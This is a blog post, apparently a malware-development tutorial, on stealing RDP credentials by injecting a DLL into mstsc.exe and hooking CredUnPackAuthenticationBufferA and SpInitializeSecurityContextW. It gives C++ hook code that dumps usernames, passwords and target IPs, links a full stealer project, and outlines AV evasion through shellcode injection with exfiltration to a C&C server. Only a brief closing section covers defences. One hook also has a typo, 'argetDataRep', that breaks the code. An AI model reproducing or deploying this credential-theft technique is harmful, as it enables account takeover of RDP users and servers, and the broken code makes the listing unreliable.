---
layout: post
title: "Stealing rdp credentials"
date: 2024-08-30 12:00:00
tags : [maldev, windows]
---

# Disclamer

First of all, a small disclaimer. The author does not encourage you to use the project shown in this article to steal other people's authorization data. This article explains how attackers can steal your authorization data from mstsc.exe ( WINDOWS RDP CLIENT ) and how to detect it.

# Introduction

As you have already understood from the title, today we are going to talk about stealing RDP authorization data from the mstsc.exe client and how to detect this type of attack. It is probably worth noting that there are several similar projects on Github that implement this technique, RDPCredentialStealer, RDP-THIEF. They all use almost the same technique, which we are going to break down today. Let's get to the main part.

# Windows Credential Prompting 

When connecting to any server via mstsc.exe we enter data for authorization on the server. To request authorization data in Windows we use "Credui.dll" library, its api is completely open, you can see it [here](https://learn.microsoft.com/en-us/windows/win32/api/wincred/).

I think many people who have connected to Windows servers have seen this window : 

![Credentials_Enter_Win11_Window](/posts_assets/stealing_rdp_credentials/credentials_enter_win11_window.png).

Or this window :

![Credentials_Enter_Win10_Window](/posts_assets/stealing_rdp_credentials/credentials_enter_win10_window.png)

Both windows are called by the CredUIPromptForWindowsCredentialsA/W function to retrieve the authorization data ( The first screenshot shows the interface of the newer Windows 11 and the second shows Windows 10 ). After successful entry, the data is stored in a packed blob structure. If the program wants to get the credentials in text format, it can use the CredUnPackAuthenticationBufferA/W function.

# Stealing rdp credentials

Due to the fact that the request and input of authorization data occurs in the same process mstsc.exe we can easily intercept the entered data. The most obvious option is to inject our library into the process and hook the functions we need using the hook technique. Hooks allow us to replace any function in the program with our own. In this case, the hook will be a proxy function, which will allow us not to lose the functionality of our application. If you want to learn more about this technique you can read these articles [here](https://medium.com/geekculture/basic-windows-api-hooking-acb8d275e9b8) and [here](https://cocomelonc.github.io/tutorial/2021/11/30/basic-hooking-1.html). To install the hooks I decided to use the most convenient library for me, namely Minhook, in theory you could use Detours or write your own library from scratch. We will hook exactly CredUnPackAuthenticationBufferA/W, because it decode the Blob'a that was obtained from the CredUIPromptForWindowsCredentialsA/W function. Below is the code of the hook function : 

```cpp 
BOOL hCredUnPackAuthenticationBufferA(
    DWORD dwFlags,
    PVOID pAuthBuffer,
    DWORD cbAuthBuffer,
    LPSTR pszUserName,
    DWORD* pcchlMaxUserName,
    LPSTR pszDomainName,
    DWORD* pcchMaxDomainName,
    LPSTR pszPassword,
    DWORD* pcchMaxPassword
) {

    BOOL status = reinterpret_cast<tCredUnPackAuthenticationBufferA>(oCredUnPackAuthenticationBufferA)(dwFlags, pAuthBuffer, cbAuthBuffer, pszUserName, pcchlMaxUserName, pszDomainName, pcchMaxDomainName, pszPassword, pcchMaxPassword);

    wprintf(L"[ + ] Dumped creds -> username : %s : domain : %s : password : %s \n", pszUserName, pszDomainName, pszPassword); 

    return status;
}
```

P.s If we set the hook to CredUIPromptForWindowsCredentialsA/W, we would have to call CredUnPackAuthenticationBufferA/W separately, and this is additional and unnecessary work.

Well, we have received the data for logging on to the server, but we still haven't found out its ip address. Obviously, it is passed to some Windows Api function and we just need to find such a function. In the course of small searches we found several functions that get the Ip address of the target server when requesting authorization. These functions are "CredReadW" from "Advapi32.dll" library, "SpInitializeSecurityContextW" from "credssp.dll" library. I decided to hook "SpInitializeSecurityContextW" because I found it first of these 2. The code of the hook looks like this :

```cpp
long long hSpInitializeSecurityContextW(void* phCredential,
    void* phContext,
    void* pszTargetName,
    unsigned long  fContextReq,
    unsigned long  Reserved1,
    unsigned long  TargetDataRep,
    void* pInput,
    unsigned long  Reserved2,
    void* phNewContext,
    void* pOutput,
    unsigned long* pfContextAttr,
    void* ptsExpiry) {


    if (pszTargetName != nullptr) {
        wprintf(L"[ + ] Leaked ip -> %s \n", pszTargetName);
    }

    return reinterpret_cast<tSpInitializeSecurityContextW>(oSpInitializeSecurityContextW)(phCredential ,phContext, pszTargetName,
fContextReq, Reserved1, argetDataRep, pInput, Reserved2, phNewContext, pOutput,pfContextAttr, ptsExpiry);
}
```

Injecting the library in the "mstsc.exe" process and authorize to the server, and get this output : 

![stealed_credentials_output](/posts_assets/stealing_rdp_credentials/stealed_credentials_output.png)

You can see the full project code at this [link](https://github.com/ch4daev/rdp_credentials_stealer) 

# Possible attack vector

Here I would like to discuss one of the possible attack vectors that can be used by an attacker in combination with this technique. 

Let's assume that the attacker has already established a foothold in our system with the help of his backdoor and can perform any necessary actions on victim machine. In its current form, our technique will be detected by any, even the simplest built-in or installed AV. So what can an attacker do to hide the malware from AV eyes? The most obvious way is to turn the malware into a position-independent shellcode that will be injected into the mstsc.exe process whenever it is start in the system. After initializing in the process and installing hooks, it would wait for user input and once received, send it to the C&C server. Here is how I have outlined the approximate attack vector : 

![possible_attack_vector](/posts_assets/stealing_rdp_credentials/possible_attack_vector.png)

Actions that occur in the same process are highlighted in one color for convenience

# How to defence

For regular users, a good AV with a constantly updated threat database, as cliché and silly as it may sound, can protect against this type of threat. Ordinary users usually do not use corporate EDR systems for which a protection specialist can write rules that can be extremely useful in detecting this type of threats.

P.s I had a good option for regular users, but I couldn't release it. I wanted to try to configure the mstsc.exe process as a PPL (Protect Process Light) process, in this case no process in Ring 3 (user-mode) would be able to get a Handle to access the process memory and therefore write something to it, even with Administrator rights.

For corporate users with EDR it is necessary to control open Handles to the process mstsc.exe from unknown processes, as well as attempts to write to the virtual memory of the process. You can also control attempts to connect mstsc.exe to suspicious api addresses that do not match the white list of servers. You can also check the integrity of the process memory, in particular the credui.dll library.

As well as many etc.

# Summary 

In conclusion, I would like to say that the technique is very interesting, and it is not that difficult to implement for your own understanding. It is rather narrowly focused and probably won't be used to attack ordinary users, but there have probably been such cases.


